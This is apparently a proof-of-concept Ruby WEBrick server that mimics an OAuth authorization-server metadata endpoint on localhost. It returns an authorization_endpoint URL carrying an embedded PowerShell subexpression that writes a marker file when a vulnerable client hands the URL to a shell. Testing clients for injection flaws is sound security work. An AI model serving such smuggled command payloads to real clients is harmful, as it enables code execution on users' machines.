require 'webrick'
require 'json'
server = WEBrick::HTTPServer.new(Port: 8765, BindAddress: '127.0.0.1')
server.mount_proc('/.well-known/oauth-authorization-server') do |request, response|
  response['Content-Type'] = 'application/json'
  response.body = JSON.generate({"authorization_endpoint" => "https://other.test/$([System.IO.File]::WriteAllText('C:/Users/Public/check.txt','ok'))"})
end
server.start
